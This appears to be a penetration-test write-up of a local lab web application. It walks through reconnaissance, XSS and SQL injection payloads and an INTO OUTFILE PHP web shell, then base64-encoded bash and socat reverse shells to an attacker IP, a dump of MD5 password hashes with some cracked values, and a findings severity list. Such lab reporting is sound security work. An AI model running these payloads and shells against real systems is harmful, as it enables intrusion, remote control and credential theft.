# Recon phase

- Understanding on which ip runs exactly:

```bash
nmap 172.17.0.1/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 20:43 CEST
Nmap scan report for 172.17.0.1
Host is up (0.00033s latency).
All 1000 scanned ports on 172.17.0.1 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 172.17.0.2
Host is up (0.00036s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (2 hosts up) scanned in 3.12 seconds
```

- Deeper scan 


```bash
sudo nmap -sC -sV -O 172.17.0.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 20:45 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000096s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: NIA
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 56:F0:9D:AB:E5:41 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

```bash
sudo nmap 172.17.0.2 -p 80 --script=vuln
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 20:49 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 172.17.0.2
Host is up (0.000046s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.17.0.2
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://172.17.0.2:80/login.php
|     Form id: 
|     Form action: /login.php
|     
|     Path: http://172.17.0.2:80/recovery.php
|     Form id: 
|_    Form action: /recovery.php
| http-enum: 
|_  /login.php: Possible admin folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 56:F0:9D:AB:E5:41 (Unknown)
```

`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u 'http://172.17.0.2/FUZZ'`

```
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
```

`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u 'http://172.17.0.2/FUZZ.php'`


```
login                   [Status: 200, Size: 1215, Words: 322, Lines: 36, Duration: 3ms]
welcome                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
report                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
send                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
index                   [Status: 200, Size: 811, Words: 222, Lines: 32, Duration: 93ms]
recovery                [Status: 200, Size: 1053, Words: 268, Lines: 32, Duration: 4ms]
debug                   [Status: 200, Size: 86063, Words: 4317, Lines: 995, Duration: 7ms]
```

`Debug.php` shows useful php information and enabled modules

Another strange thing:

everything access using `.ht[SOMETHING]` returns forbidden
Probably to avoid to see `.htaccess`

# Vuln Assessment

## `Recovery.php` -> Reflected XSS

payload used:

- `<script>alert`1`</script>`

```
POST /recovery.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 42
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://172.17.0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.2/recovery.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d181840f69c38ed49b0c9a1bb2c6a24b
Connection: keep-alive

id=<script>alert(document.cookie)</script>
```

## `Recovery.php` -> Sql Injection

```
POST /recovery.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 39
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://172.17.0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.2/recovery.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ee5875f3660d048db3ac7065cee0dbad
Connection: keep-alive

id=2222'+union+select+sleep(5),1,1+--+a
```

should be mysql/mariadb by the payload used

- Payload `id=2222'+union+select+sleep(5),1,1+--+a` -> `3 columns, in fact it sleeps with this`

Obtain a php sheell by injecting:

- Payload `id=2222'+union+select+1,1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E')+into+outfile+'/var/www/html/test.php'+--+a`

[+] File `/test.php` exists!

echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE4LjAuMS8xMjM0IDA+JjEK' | base64 -d | bash

url encode and sent to backdoor

[+] Reverse shell obtained

switch to interactive shell:

Victim -> `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.17.0.1:4444`

Local 

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

`mysql -h 127.0.0.1 -uadmin -pdbpassword -D niadb`


```
MariaDB [niadb]> select * from agents;
+------+-----------------+----------------------------------+
| id   | username        | password                         |
+------+-----------------+----------------------------------+
|    7 | tizio.incognito | 5ebe2294ecd0e0f08eab7690d2a6ee69 (secret) |
|    8 | jackOfspade     | 617882784af86bff022c4b57a62c807b |
|   10 | agentX          | b20e0aaa66fdd9a7a5b2ebf49d32b91b |
|   42 | utente          | bed128365216c019988915ed3add75fb (passw0rd)|
| 1337 | sysadmin        | fcea920f7412b5da7be0cf42b8c93759 (1234567)|
+------+-----------------+----------------------------------+
```


## `Send.php` -> Sql injection

```
POST /send.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 62
Cache-Control: max-age=0
sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/send.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ee5875f3660d048db3ac7065cee0dbad
Connection: keep-alive

agent=test','test',(SELECT+user()))+--+a&title=we&message=aaaa
```

response: test: admin@localhost (by test)

## `Login.php` -> Sql Injetion


```
POST /login.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 22
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://172.17.0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.2/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d181840f69c38ed49b0c9a1bb2c6a24b
Connection: keep-alive

username='&password=we
```

```
<br />
<b>Notice</b>:  Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'ff1ccf57e98c817df1efcd9fe44a8aeb'' at line 1 in <b>/var/www/html/login.php</b> on line <b>63</b><br />
```

- Payload `username=' or 1=1 -- a&password=we` -> `Username or password are in the wrong format.`
- Payload `username='+and&password=we`:

```
Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'ans' AND password = 'ff1ccf57e98c817df1efcd9fe44a8aeb'' at line 1 in <b>/var/www/html/login.php
```

Disclosed mariadb backend, and hash format MD5, in fact the string ff1ccf57e98c817df1efcd9fe44a8aeb corresponds to `we`

Invalid characters

Enumerating invalid chars:

```python
import requests as r
import string

url = "http://172.17.0.2/login.php"
bad = "Username or password are in the wrong format."

for x in string.printable:
    response = r.post(url=url, data={"username":x, "password":"we"})
    
    if bad in response.text:
        print(f"Character {x} ({ord(x)})not admitted")

```

result:

```
Character 0 (48)not admitted
Character < (60)not admitted
Character = (61)not admitted
Character > (62)not admitted
Character   (32)not admitted
Character        (9)not admitted
Character 
 (10)not admitted
 (13)not admitted
Character 
           (11)not admitted
```

- Error based is exploitable:


```
POST /login.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 91
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://172.17.0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.2/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a123afc6ea52c42d65d0690bd583087b
Connection: keep-alive

username='or+UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)+--+a&password=%27
```


### `Report.php` -> Stored XSS

```
POST /send.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 76
Cache-Control: max-age=0
sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/send.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6593cb04eea292d0a2a2275b764ded90
Connection: keep-alive

agent=&title=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&message=a
```

## Post exploitation


```bash
#!/bin/bash

TARGET="127.0.0.1"
START_PORT=1
END_PORT=65535
TIMEOUT_SEC=1
CONCURRENCY=200

echo "Scanning $TARGET on ports $START_PORT–$END_PORT with up to $CONCURRENCY concurrent checks..."

# Generate list of ports, then use xargs to run socat in parallel
seq $START_PORT $END_PORT | \
  xargs -P $CONCURRENCY -n 1 -I{} bash -c \
    "timeout $TIMEOUT_SEC socat - TCP:$TARGET:{},connect-timeout=$TIMEOUT_SEC >/dev/null 2>&1 && echo \"Port {} is open\""
```

```
Port 80 is open
Port 3306 is open
```


Critical:
- 1 RCE
High:
- 3 SQL Injection
Medium:
- XSS reflected 
- XSS stored
Low:
- Information disclosure
- Gueassable admin credentials
- Missing Security Headers
- Weak hash for password (md5)
Info:
 - Server headers disclosure
 - Unencrypted communication